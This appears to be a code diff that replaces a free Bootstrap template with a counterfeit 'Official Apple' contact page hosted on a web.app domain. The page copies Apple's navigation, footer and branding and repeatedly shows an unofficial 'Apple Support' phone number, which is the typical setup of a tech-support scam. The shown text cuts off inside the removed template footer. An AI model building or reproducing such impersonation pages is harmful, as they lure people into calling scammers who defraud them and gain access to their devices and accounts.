@@ -1,9 +1,9 @@
-<!DOCTYPE html>
-<html class="no-js" lang="">
-  <head>
-	  <!-- Histats.com  START  (aync)-->
+<!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" class="no-js">
+<head>
+  
+   <!-- Histats.com  START  (aync)-->
 <script type="text/javascript">var _Hasync= _Hasync|| [];
-_Hasync.push(['Histats.start', '1,5021244,4,0,0,0,00010000']);
+_Hasync.push(['Histats.start', '1,5021731,4,0,0,0,00010000']);
 _Hasync.push(['Histats.fasi', '1']);
 _Hasync.push(['Histats.track_hits', '']);
 (function() {
@@ -11,628 +11,365 @@ var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async
 hs.src = ('//s10.histats.com/js15_as.js');
 (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
 })();</script>
-<noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5021244&101" alt="website statistics" border="0"></a></noscript>
+<noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5021731&101" alt="free webpage hit counter" border="0"></a></noscript>
 <!-- Histats.com  END  -->
-    <meta charset="utf-8" />
-    <meta http-equiv="x-ua-compatible" content="ie=edge" />
-    <title>Flat - Bootstrap 5 Template</title>
-    <meta name="description" content="" />
-    <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <!-- Place favicon.ico in the root directory -->
+<script defer data-domain="gllow-treathubb.web.app" src="https://plausible.io/js/script.js"></script>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="cache-control" content="max-age=3600">
+    <title>Contact - Official Apple</title>
+    <meta name="description" content="Contact Apple support by phone or chat, set up a repair, or make a Genius Bar appointment for iPhone, iPad, Mac and more.">
+    <link rel="stylesheet" href="css/Base.css" type="text/css">
+    <link rel="stylesheet" type="text/css" href="_families%253dSF%252bPro%252cv1_7CSF%252bPro%252bIcons%252cv1html.html">
+    <script src="js/text_tel.js"></script>
 
-    <!-- ========================= CSS here ========================= -->
-    <link rel="stylesheet" href="assets/css/bootstrap-5.0.0-alpha-2.min.css" />
-    <link rel="stylesheet" href="assets/css/LineIcons.2.0.css"/>
-    <link rel="stylesheet" href="assets/css/animate.css"/>
-    <link rel="stylesheet" href="assets/css/lindy-uikit.css"/>
-  </head>
-  <body>
-    <!--[if lte IE 9]>
-      <p class="browserupgrade">
-        You are using an <strong>outdated</strong> browser. Please
-        <a href="https://browsehappy.com/">upgrade your browser</a> to improve
-        your experience and security.
-      </p>
-    <![endif]-->
+</head>
 
-    <!-- ========================= preloader start ========================= -->
-    <div class="preloader">
-      <div class="loader">
-        <div class="spinner">
-          <div class="spinner-container">
-            <div class="spinner-rotator">
-              <div class="spinner-left">
-                <div class="spinner-circle"></div>
-              </div>
-              <div class="spinner-right">
-                <div class="spinner-circle"></div>
-              </div>
-            </div>
-          </div>
+<body>
+    <div id="result"></div>
+    <input type="checkbox" id="ac-gn-menustate" class="ac-gn-menustate">
+    <nav id="ac-globalnav" class="no-js">
+        <div class="ac-gn-content">
+            <ul class="ac-gn-header">
+                <li class="ac-gn-item ac-gn-menuicon">
+                    <label class="ac-gn-menuicon-label" for="ac-gn-menustate" aria-hidden="true">
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-top">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-top"></span>
+					 </span>
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-bottom">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-bottom"></span>
+					 </span>
+				 </label>
+                    <a href="#ac-gn-menustate" class="ac-gn-menuanchor ac-gn-menuanchor-open" id="ac-gn-menuanchor-open">
+					 <span class="ac-gn-menuanchor-label">Open Menu </span></a>
+                    <a href="#" class="ac-gn-menuanchor ac-gn-menuanchor-close" id="ac-gn-menuanchor-close">
+					 <span class="ac-gn-menuanchor-label">Close Menu </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus-small">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag ac-gn-bag-small" id="ac-gn-bag-small">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#"><span class="ac-gn-link-text">Shopping Bag </span><span class="ac-gn-bag-badge"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <ul class="ac-gn-list">
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-mac">
+                    <a class="ac-gn-link ac-gn-link-mac" href="#">
+					 <span class="ac-gn-link-text">Mac </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-ipad">
+                    <a class="ac-gn-link ac-gn-link-ipad" href="#">
+					 <span class="ac-gn-link-text">iPad </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-iphone">
+                    <a class="ac-gn-link ac-gn-link-iphone" href="#">
+					 <span class="ac-gn-link-text">iPhone </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-watch">
+                    <a class="ac-gn-link ac-gn-link-watch" href="#">
+					 <span class="ac-gn-link-text">Watch </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-tv">
+                    <a class="ac-gn-link ac-gn-link-tv" href="#">
+					 <span class="ac-gn-link-text">TV </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-music">
+                    <a class="ac-gn-link ac-gn-link-music" href="#">
+					 <span class="ac-gn-link-text">Music </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-support">
+                    <a class="ac-gn-link ac-gn-link-support" href="#">
+					 <span class="ac-gn-link-text">Support </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-search" role="search">
+                    <a class="ac-gn-link ac-gn-link-search" href="#">
+					 <span class="ac-gn-search-placeholder" aria-hidden="true">Search apple.com </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag" id="ac-gn-bag">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#" aria-label="Shopping Bag">
+					 <span class="ac-gn-link-text">Shopping Bag </span>
+					 <span class="ac-gn-bag-badge" aria-hidden="true"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <aside id="ac-gn-searchview" class="ac-gn-searchview" role="search">
+                <div class="ac-gn-searchview-content">
+                    <form id="ac-gn-searchform" class="ac-gn-searchform" action="http://www.apple.com/us/search" method="get">
+                        <div class="ac-gn-searchform-wrapper">
+                            <input id="ac-gn-searchform-input" class="ac-gn-searchform-input" type="text" placeholder="Search apple.com" autocorrect="off" autocapitalize="off" autocomplete="off" spellcheck="false">
+                            <input id="ac-gn-searchform-src" type="hidden" name="src" value="globalnav">
+                            <button id="ac-gn-searchform-submit" class="ac-gn-searchform-submit" type="submit" disabled="" aria-label="Submit"></button>
+                            <button id="ac-gn-searchform-reset" class="ac-gn-searchform-reset" type="reset" disabled="" aria-label="Clear Search"></button>
+                        </div>
+                    </form>
+                    <aside id="ac-gn-searchresults" class="ac-gn-searchresults"></aside>
+                </div>
+                <button id="ac-gn-searchview-close" class="ac-gn-searchview-close" aria-label="Close Search">
+					 <span class="ac-gn-searchview-close-wrapper">
+						 <span class="ac-gn-searchview-close-left"></span>
+						 <span class="ac-gn-searchview-close-right"></span>
+					 </span>
+			 </button>
+            </aside>
+            <aside class="ac-gn-bagview">
+                <div class="ac-gn-bagview-scrim">
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-small"></span>
+                </div>
+                <div class="ac-gn-bagview-content" id="ac-gn-bagview-content">
+                </div>
+            </aside>
         </div>
-      </div>
+    </nav>
+    <div id="ac-gn-curtain" class="ac-gn-curtain"></div>
+    <div id="ac-gn-placeholder" class="ac-nav-placeholder"></div>
+
+    <div class="main">
+        <nav id="ac-localnav" class="js no-touch css-sticky" lang="en-US" role="navigation" data-sticky="">
+            <div class="ac-ln-wrapper">
+                <div class="ac-ln-background"></div>
+                <div class="ac-ln-content">
+                    <span class="ac-ln-title">
+                       <a href="#">Apple Support +1-844-449-3831 <font color="red"><font class="js_setPhoneBlock"></font></font></a>
+					 </span>
+                    <div class="ac-ln-menu">
+                        <a href="#ac-ln-menustate" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-open" id="ac-ln-menustate-open">  <span class="ac-ln-menucta-anchor-label">Open menu </span></a> <a href="#" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-close" id="ac-ln-menustate-close">  <span class="ac-ln-menucta-anchor-label">Close menu </span></a>
+                        <div class="ac-ln-menu-tray">
+                            <ul class="ac-ln-menu-items">
+                                <li class="ac-ln-menu-item"><a href="#" class="ac-ln-menu-link analytics-exitlink"> Communities </a>
+                                </li>
+                            </ul>
+                        </div>
+                        <div class="ac-ln-actions">
+                            <div class="ac-ln-action ac-ln-action-menucta" aria-hidden="true">
+                                <label for="ac-ln-menustate" class="ac-ln-menucta">  <span class="ac-ln-menucta-chevron"></span>
+							 </label>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </nav>
+        <section class="as-columns  as-columns--1up  as-banner as-banner--top">
+            <div class="row">
+                <div class="column large-12 medium-12 small-12">
+                    <div class="as-banner-cont">
+                        <div class="as-banner-image as-banner-image--top">
+                            <style type="text/css">
+                                .as-banner-image.as-banner-image--top {
+                                    background-image: url("images/contact-us-hero.image.large_2x.jpg");
+                                }
+
+                                .as-banner-image.as-banner-image--top:before {
+                                    content: "";
+                                    display: block;
+                                }
+
+                                @media only screen and (max-width: 735px) {
+                                    .as-banner-image.as-banner-image--top {
+                                        background-image: url("images/contact-us-hero.image.small_2x.jpg");
+                                    }
+                                }
+                            </style>
+                            <img sizes="(min-width:735px ) 735w, 100vw" srcset="images/contact-us-hero.image.small_2x.jpg 735w, images/contact-us-hero.image.large_2x.jpg 1440w" alt="" class="as-image-speculativedownload" src="images/contact-us-hero.image.large_2x.jpg">
+                        </div>
+                    </div>
+                    <div class="as-banner-content">
+                        <div class="pageTitle  ">
+                            <h1 class="pageTitle-heading">Apple Support </h1>
+                            <p class="pageTitle-intro js_setTextBlock">
+                        </p></div>
+                        <div class="sectionTitle sectionTitleBlock">
+                            <h2 class="sectionTitle-heading"></h2>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
     </div>
-    <!-- ========================= preloader end ========================= -->
 
-    <!-- ========================= hero-section-wrapper-2 start ========================= -->
-    <section id="home" class="hero-section-wrapper-2">
-
-      <!-- ========================= header-2 start ========================= -->
-      <header class="header header-2">
-        <div class="navbar-area">
-          <div class="container">
-            <div class="row align-items-center">
-              <div class="col-lg-12">
-                <nav class="navbar navbar-expand-lg">
-                  <a class="navbar-brand" href="index.html">
-                    <img src="assets/img/logo/logo.svg" alt="Logo" />
-                  </a>
-                  <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent2" aria-controls="navbarSupportedContent2" aria-expanded="false" aria-label="Toggle navigation">
-                    <span class="toggler-icon"></span>
-                    <span class="toggler-icon"></span>
-                    <span class="toggler-icon"></span>
-                  </button>
-
-                  <div class="collapse navbar-collapse sub-menu-bar" id="navbarSupportedContent2">
-                    <ul id="nav2" class="navbar-nav ml-auto">
-                      <li class="nav-item">
-                        <a class="page-scroll active" href="#home">Home</a>
-                      </li>
-                      <li class="nav-item">
-                        <a class="page-scroll" href="#services">Services</a>
-                      </li>
-                      <li class="nav-item">
-                        <a class="page-scroll" href="#about">About</a>
-                      </li>
-                      <li class="nav-item">
-                        <a class="page-scroll" href="#pricing">Pricing</a>
-                      </li>
-                      <li class="nav-item">
-                        <a class="page-scroll" href="#contact">Contact</a>
-                      </li>
-                    </ul>
-                    <a href="#0" class="button button-sm radius-10 d-none d-lg-flex">Get Started</a>
-                  </div>
-                  <!-- navbar collapse -->
-                </nav>
-                <!-- navbar -->
-              </div>
-            </div>
-            <!-- row -->
-          </div>
-          <!-- container -->
+    <footer id="ac-globalfooter" class="no-js">
+        <div class="ac-gf-content">
+            <section class="ac-gf-footer">
+                <div class="ac-gf-footer-shop"> More ways to: Visit an <a href="#" class="analytics-exitlink">Apple Store </a>, <span class="nowrap">call  <font class="js_setPhoneBlock"></font>, or  <a href="#" class="analytics-exitlink">find a reseller </a></span>.
+                </div>
+                <div class="ac-gf-footer-locale">
+                    <a class="ac-gf-footer-locale-link" href="#" title="Choose your country or region" aria-label="United States. Choose your country or region"><img class="ac-gf-footer-locale-flag" src="images/us.png" alt="" width="16" height="16">United
+					States </a>
+                </div>
+                <div class="ac-gf-footer-legal">
+                    <div class="ac-gf-footer-legal-copyright">Copyright© 2025 Apple . All rights reserved. </div>
+                    <div class="ac-gf-footer-legal-links"><a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Privacy
+					Policy </a> <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Terms of Use </a>
+                        <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Sales and Refunds </a> <a class="ac-gf-footer-legal-link" href="#">Site
+						Map </a> <a class="ac-gf-footer-legal-link" href="#">Contact
+						Apple </a></div>
+                </div>
+                <meta content="Apple" property="name">
+                <meta content="+1-844-449-3831
+			 " property="telephone">
+            </section>
         </div>
-        <!-- navbar area -->
-      </header>
-      <!-- ========================= header-2 end ========================= -->
-
-      <!-- ========================= hero-2 start ========================= -->
-      <div class="hero-section hero-style-2">
-        <div class="container">
-          <div class="row align-items-end">
-            <div class="col-lg-6">
-              <div class="hero-content-wrapper">
-                <h4 class="wow fadeInUp" data-wow-delay=".2s">You're Using</h4>
-                <h2 class="mb-30 wow fadeInUp" data-wow-delay=".4s">Free Lite Version of Template</h2>
-                <p class="mb-50 wow fadeInUp" data-wow-delay=".6s">Please, purchase full version of the template to get all sections, features and permission to remove footer credit</p>
-                <div class="buttons">
-                  <a href="https://rebrand.ly/flat-ud/" rel="nofollow" target="blank" class="button button-lg radius-10 wow fadeInUp" data-wow-delay=".7s">Purchase Now</a>
-                </div>
-              </div>
-            </div>
-            <div class="col-lg-6">
-              <div class="hero-image">
-                <img src="assets/img/hero/hero-2/hero-img.svg" alt="" class="wow fadeInRight" data-wow-delay=".2s">
-                <img src="assets/img/hero/hero-2/paattern.svg" alt="" class="shape shape-1">
-              </div>
-            </div>
-          </div>
-        </div>
-      </div>
-      <!-- ========================= hero-2 end ========================= -->
-
-    </section>
-    <!-- ========================= hero-section-wrapper-2 end ========================= -->
-
-    <!-- ========================= feature style-2 start ========================= -->
-    <section id="services" class="feature-section feature-style-2">
-      <div class="container">
-        <div class="row">
-          <div class="col-lg-8">
-            <div class="row">
-              <div class="col-xl-7 col-lg-10 col-md-9">
-                <div class="section-title mb-60">
-                  <h3 class="mb-15 wow fadeInUp" data-wow-delay=".2s">The future of designing starts here</h3>
-                  <p class="wow fadeInUp" data-wow-delay=".4s">Stop wasting time and money designing and managing a website that doesn’t get results. Happiness guaranteed!</p>
-                </div>
-              </div>
-            </div>
-
-            <div class="row">
-              <div class="col-md-6">
-                <div class="single-feature wow fadeInUp" data-wow-delay=".2s">
-                  <div class="icon">
-                    <i class="lni lni-vector"></i>
-                  </div>
-                  <div class="content">
-                    <h5 class="mb-25">Graphics Design</h5>
-                    <p>Short description for the ones who look for something new.</p>
-                  </div>
-                </div>
-              </div>
-              <div class="col-md-6">
-                <div class="single-feature wow fadeInUp" data-wow-delay=".4s">
-                  <div class="icon">
-                    <i class="lni lni-layers"></i>
-                  </div>
-                  <div class="content">
-                    <h5 class="mb-25">UI/UX Design</h5>
-                    <p>Short description for the ones who look for something new.</p>
-                  </div>
-                </div>
-              </div>
-              <div class="col-md-6">
-                <div class="single-feature wow fadeInUp" data-wow-delay=".6s">
-                  <div class="icon">
-                    <i class="lni lni-layout"></i>
-                  </div>
-                  <div class="content">
-                    <h5 class="mb-25">Web Design</h5>
-                    <p>Short description for the ones who look for something new.</p>
-                  </div>
-                </div>
-              </div>
-              <div class="col-md-6">
-                <div class="single-feature wow fadeInUp" data-wow-delay=".8s">
-                  <div class="icon">
-                    <i class="lni lni-display"></i>
-                  </div>
-                  <div class="content">
-                    <h5 class="mb-25">Web Development</h5>
-                    <p>Short description for the ones who look for something new.</p>
-                  </div>
-                </div>
-              </div>
-            </div>
-
-          </div>
-        </div>
-      </div>
-      <div class="feature-img wow fadeInLeft" data-wow-delay=".2s">
-        <img src="assets/img/feature/feature-2-1.svg" alt="">
-      </div>
-    </section>
-		<!-- ========================= feature style-2 end ========================= -->
-
-    <!-- ========================= about style-3 start ========================= -->
-    <section id="about" class="about-section about-style-3">
-      <div class="container">
-        <div class="row align-items-center">
-          <div class="col-lg-6">
-            <div class="about-image wow fadeInLeft" data-wow-delay=".2s">
-              <img src="assets/img/about/about-3/about-img.jpg" alt="">
-            </div>
-          </div>
-          <div class="col-lg-6">
-            <div class="about-content-wrapper">
-              <div class="section-title mb-40">
-                <h3 class="mb-25 wow fadeInUp" data-wow-delay=".2s">The future of designing starts here</h3>
-                <p class="wow fadeInUp" data-wow-delay=".4s">Stop wasting time and money designing and managing a website that doesn’t get results. Happiness guaranteed, Stop wasting time and money designing and managing a website that doesn’t get results. Happiness guaranteed,</p>
-              </div>
-              <div class="counter-up-wrapper mb-40 wow fadeInUp" data-wow-delay=".6s">
-                <div class="single-counter">
-                  <h4 class="countup" id="secondo1" cup-end="123" cup-append="M">123 M</h4>
-                  <h6>Happy Client</h6>
-                </div>
-                <div class="single-counter">
-                  <h4 class="countup" id="secondo2" cup-end="1434" cup-append="K">1434 K</h4>
-                  <h6>Project Done</h6>
-                </div>
-                <div class="single-counter">
-                  <h4 class="countup" id="secondo3" cup-end="134" cup-append="K">134 K</h4>
-                  <h6>Award Win</h6>
-                </div>
-              </div>
-              <a href="#0" class="button button-lg radius-3 wow fadeInUp" data-wow-delay=".7s">Learn More</a>
-            </div>
-          </div>
-        </div>
-      </div>
-    </section>
-    <!-- ========================= about style-3 end ========================= -->
-
-
-              <div class="container pt-60 pb-60">
-                <h4 class="wow fadeInUp" data-wow-delay=".2s">You're Using</h4>
-                <h2 class="mb-30 wow fadeInUp" data-wow-delay=".4s">Free Lite Version of Template</h2>
-                <p class="mb-50 wow fadeInUp" data-wow-delay=".6s">Please, purchase full version of the template to get all sections, features and permission to remove footer credit</p>
-                <div class="buttons">
-                  <a href="https://rebrand.ly/flat-ud/" rel="nofollow" target="blank" class="button button-lg radius-10 wow fadeInUp" data-wow-delay=".7s">Purchase Now</a>
-                </div>
-              </div>
-
-		<!-- ========================= pricing style-1 start ========================= -->
-		<section id="pricing" class="pricing-section pricing-style-1 bg-white">
-      <div class="container">
-        <div class="row justify-content-center">
-          <div class="col-xxl-5 col-xl-5 col-lg-7 col-md-10">
-            <div class="section-title text-center mb-60">
-              <h3 class="mb-15 wow fadeInUp" data-wow-delay=".2s">Pricing Plan</h3>
-              <p class="wow fadeInUp" data-wow-delay=".4s">Stop wasting time and money designing and managing a website that doesn’t get results. Happiness guaranteed!</p>
-            </div>
-          </div>
-        </div>
-
-        <div class="row justify-content-center">
-          <div class="col-lg-4 col-md-8 col-sm-10">
-            <div class="single-pricing wow fadeInUp" data-wow-delay=".2s">
-              <div class="image">
-                <img src="assets/img/pricing/pricing-1/pricing-1.svg" alt="">
-              </div>
-              <h6>Basic Design</h6>
-              <h4>Web Design</h4>
-              <h3>$ 29.00</h3>
-              <ul>
-                <li> <i class="lni lni-checkmark-circle"></i> Carefully crafted components</li>
-                <li> <i class="lni lni-checkmark-circle"></i> Amazing page examples</li>
-                <li> <i class="lni lni-checkmark-circle"></i> Super friendly support team</li>
-                <li> <i class="lni lni-checkmark-circle"></i> Awesome Support</li>
-              </ul>
-              <a href="#0" class="button radius-30">Get Started</a>
-            </div>
-          </div>
-          <div class="col-lg-4 col-md-8 col-sm-10">
-            <div class="single-pricing active wow fadeInUp" data-wow-delay=".4s">
-              <span class="button button-sm radius-30 popular-badge">Popular</span>
-              <div class="image">
-                <img src="assets/img/pricing/pricing-1/pricing-2.svg" alt="">
-              </div>
-              <h6>Standard Design</h6>
-              <h4>Web Development</h4>
-              <h3>$ 89.00</h3>
-              <ul>
-                <li> <i class="lni lni-checkmark-circle"></i> Carefully crafted components</li>
-                <li> <i class="lni lni-checkmark-circle"></i> Amazing page examples</li>
-                <li> <i class="lni lni-checkmark-circle"></i> Super friendly support team</li>
-                <li> <i class="lni lni-checkmark-circle"></i> Awesome Support</li>
-              </ul>
-              <a href="#0" class="button radius-30">Get Started</a>
-            </div>
-          </div>
-          <div class="col-lg-4 col-md-8 col-sm-10">
-            <div class="single-pricing wow fadeInUp" data-wow-delay=".6s">
-              <div class="image">
-                <img src="assets/img/pricing/pricing-1/pricing-3.svg" alt="">
-              </div>
-              <h6>Pro Design</h6>
-              <h4>Design & Develop</h4>
-              <h3>$ 199.00</h3>
-              <ul>
-                <li> <i class="lni lni-checkmark-circle"></i> Carefully crafted components</li>
-                <li> <i class="lni lni-checkmark-circle"></i> Amazing page examples</li>
-                <li> <i class="lni lni-checkmark-circle"></i> Super friendly support team</li>
-                <li> <i class="lni lni-checkmark-circle"></i> Awesome Support</li>
-              </ul>
-              <a href="#0" class="button radius-30">Get Started</a>
-            </div>
-          </div>
-        </div>
-
-      </div>
-    </section>
-    <!-- ========================= pricing style-1 end ========================= -->
-
-		<!-- ========================= team style-1 start ========================= -->
-		<section id="team" class="team-section team-style-1">
-      <div class="container">
-        <div class="row justify-content-center">
-          <div class="col-xxl-5 col-xl-5 col-lg-7 col-md-10">
-            <div class="section-title text-center mb-60">
-              <h3 class="mb-15 wow fadeInUp" data-wow-delay=".2s">Our Team</h3>
-              <p class="wow fadeInUp" data-wow-delay=".4s">Stop wasting time and money designing and managing a website that doesn’t get results. Happiness guaranteed!</p>
-            </div>
-          </div>
-        </div>
-        
-        <div class="row justify-content-center">
-          <div class="col-xl-3 col-md-6 col-sm-10">
-            <div class="single-team wow fadeInUp" data-wow-delay=".2s">
-              <div class="image">
-                <img src="assets/img/team/team-1/team-1.png" alt="">
-              </div>
-              <div class="info">
-                <h6>John Doe</h6>
-                <p>Product Designer</p>
-                <ul class="socials">
-                  <li>
-                    <a href="#0"> <i class="lni lni-facebook-filled"></i> </a>
-                  </li>
-                  <li>
-                    <a href="#0"> <i class="lni lni-twitter-filled"></i> </a>
-                  </li>
-                  <li>
-                    <a href="#0"> <i class="lni lni-instagram-filled"></i> </a>
-                  </li>
-                  <li>
-                    <a href="#0"> <i class="lni lni-linkedin-original"></i> </a>
-                  </li>
-                </ul>
-              </div>
-            </div>
-          </div>
-          <div class="col-xl-3 col-md-6 col-sm-10">
-            <div class="single-team wow fadeInUp" data-wow-delay=".4s">
-              <div class="image">
-                <img src="assets/img/team/team-1/team-2.png" alt="">
-              </div>
-              <div class="info">
-                <h6>David Endow</h6>
-                <p>Creative Designer</p>
-                <ul class="socials">
-                  <li>
-                    <a href="#0"> <i class="lni lni-facebook-filled"></i> </a>
-                  </li>
-                  <li>
-                    <a href="#0"> <i class="lni lni-twitter-filled"></i> </a>
-                  </li>
-                  <li>
-                    <a href="#0"> <i class="lni lni-instagram-filled"></i> </a>
-                  </li>
-                  <li>
-                    <a href="#0"> <i class="lni lni-linkedin-original"></i> </a>
-                  </li>
-                </ul>
-              </div>
-            </div>
-          </div>
-          <div class="col-xl-3 col-md-6 col-sm-10">
-            <div class="single-team wow fadeInUp" data-wow-delay=".6s">
-              <div class="image">
-                <img src="assets/img/team/team-1/team-3.png" alt="">
-              </div>
-              <div class="info">
-                <h6>Jonathon Smith</h6>
-                <p>Brand Designer</p>
-                <ul class="socials">
-                  <li>
-                    <a href="#0"> <i class="lni lni-facebook-filled"></i> </a>
-                  </li>
-                  <li>
-                    <a href="#0"> <i class="lni lni-twitter-filled"></i> </a>
-                  </li>
-                  <li>
-                    <a href="#0"> <i class="lni lni-instagram-filled"></i> </a>
-                  </li>
-                  <li>
-                    <a href="#0"> <i class="lni lni-linkedin-original"></i> </a>
-                  </li>
-                </ul>
-              </div>
-            </div>
-          </div>
-          <div class="col-xl-3 col-md-6 col-sm-10">
-            <div class="single-team wow fadeInUp" data-wow-delay=".8s">
-              <div class="image">
-                <img src="assets/img/team/team-1/team-4.png" alt="">
-              </div>
-              <div class="info">
-                <h6>Gray Simon</h6>
-                <p>Frontend Developer</p>
-                <ul class="socials">
-                  <li>
-                    <a href="#0"> <i class="lni lni-facebook-filled"></i> </a>
-                  </li>
-                  <li>
-                    <a href="#0"> <i class="lni lni-twitter-filled"></i> </a>
-                  </li>
-                  <li>
-                    <a href="#0"> <i class="lni lni-instagram-filled"></i> </a>
-                  </li>
-                  <li>
-                    <a href="#0"> <i class="lni lni-linkedin-original"></i> </a>
-                  </li>
-                </ul>
-              </div>
-            </div>
-          </div>
-        </div>
-
-      </div>
-    </section>
-    <!-- ========================= team style-1 end ========================= -->
-
-              <div class="container pt-60 pb-60">
-                <h4 class="wow fadeInUp" data-wow-delay=".2s">You're Using</h4>
-                <h2 class="mb-30 wow fadeInUp" data-wow-delay=".4s">Free Lite Version of Template</h2>
-                <p class="mb-50 wow fadeInUp" data-wow-delay=".6s">Please, purchase full version of the template to get all sections, features and permission to remove footer credit</p>
-                <div class="buttons">
-                  <a href="https://rebrand.ly/flat-ud/" rel="nofollow" target="blank" class="button button-lg radius-10 wow fadeInUp" data-wow-delay=".7s">Purchase Now</a>
-                </div>
-              </div>
-
-    <!-- ========================= contact style-6 start ========================= -->
-    <section id="contact" class="contact-section contact-style-6">
-      <div class="container">
-        <div class="row">
-          <div class="col-lg-7">
-            <div class="contact-form-wrapper">
-              <form action="assets/php/contact.php" method="POST">
-                <div class="row">
-                  <div class="col-md-6">
-                    <div class="single-input">
-                      <label for="name">Name</label>
-                      <input type="text" id="name" name="name" class="form-input" placeholder="Name">
-                      <i class="lni lni-user"></i>
-                    </div>
-                  </div>
-                  <div class="col-md-6">
-                    <div class="single-input">
-                      <label for="email">Email</label>
-                      <input type="email" id="email" name="email" class="form-input" placeholder="Email">
-                      <i class="lni lni-envelope"></i>
-                    </div>
-                  </div>
-                  <div class="col-md-6">
-                    <div class="single-input">
-                      <label for="number">Number</label>
-                      <input type="text" id="number" name="number" class="form-input" placeholder="Number">
-                      <i class="lni lni-phone"></i>
-                    </div>
-                  </div>
-                  <div class="col-md-6">
-                    <div class="single-input">
-                      <label for="subject">Subject</label>
-                      <input type="text" id="subject" name="subject" class="form-input" placeholder="Subject">
-                      <i class="lni lni-text-format"></i>
-                    </div>
-                  </div>
-                  <div class="col-md-12">
-                    <div class="single-input">
-                      <label for="message">Message</label>
-                      <textarea name="message" id="message" class="form-input" placeholder="Message" rows="6"></textarea>
-                      <i class="lni lni-comments-alt"></i>
-                    </div>
-                  </div>
-                  <div class="col-md-12">
-                    <div class="form-button">
-                      <button type="submit" class="button radius-10">Submit <i class="lni lni-telegram-original"></i> </button>
-                    </div>
-                  </div>
-                </div>
-              </form>
-            </div>
-
-          </div>
-
-          <div class="col-lg-5 order-first order-lg-last">
-            <div class="left-wrapper">
-              <div class="section-title mb-40">
-                <h3 class="mb-15">Get in touch</h3>
-                <p>Stop wasting time and money designing and managing a website that doesn’t get results. Happiness guaranteed!</p>
-              </div>
-              <div class="row">
-                <div class="col-lg-12 col-md-6">
-                  <div class="single-item">
-                    <div class="icon">
-                      <i class="lni lni-phone"></i>
-                    </div>
-                    <div class="text">
-                      <p>0045939863784</p>
-                    </div>
-                  </div>
-                </div>
-                <div class="col-lg-12 col-md-6">
-                  <div class="single-item">
-                    <div class="icon">
-                      <i class="lni lni-envelope"></i>
-                    </div>
-                    <div class="text">
-                      <p>yourmail@gmail.com</p>
-                    </div>
-                  </div>
-                </div>
-                <div class="col-lg-12 col-md-6">
-                  <div class="single-item">
-                    <div class="icon">
-                      <i class="lni lni-map-marker"></i>
-                    </div>
-                    <div class="text">
-                      <p>John's House, 13/5 Road, Sidny United State Of America</p>
-                    </div>
-                  </div>
-                </div>
-              </div>
-            </div>
-          </div>
-        </div>
-      </div>
-    </section>
-    <!-- ========================= contact style-6 end ========================= -->
-
-    <!-- ========================= clients-logo start ========================= -->
-    <section class="clients-logo-section pt-100 pb-100">
-      <div class="container">
-        <div class="row">
-          <div class="col-lg-12">
-            <div class="client-logo wow fadeInUp" data-wow-delay=".2s">
-              <img src="assets/img/clients/brands.svg" alt="" class="w-100">
-            </div>
-          </div>
-        </div>
-      </div>
-    </section>
-    <!-- ========================= clients-logo end ========================= -->
-
-		<!-- ========================= footer style-1 start ========================= -->
-    <footer class="footer footer-style-1">
-      <div class="container">
-        <div class="widget-wrapper">
-          <div class="row">
-            <div class="col-xl-3 col-lg-4 col-md-6">
-              <div class="footer-widget wow fadeInUp" data-wow-delay=".2s">
-                <div class="logo">
-                  <a href="#0"> <img src="assets/img/logo/logo.svg" alt=""> </a>
-                </div>
-                <p class="desc">Lorem ipsum dolor sit amet, consectetur adipiscing elit. Facilisis nulla placerat amet amet congue.</p>
-                <ul class="socials">
-                  <li> <a href="#0"> <i class="lni lni-facebook-filled"></i> </a> </li>
-                  <li> <a href="#0"> <i class="lni lni-twitter-filled"></i> </a> </li>
-                  <li> <a href="#0"> <i class="lni lni-instagram-filled"></i> </a> </li>
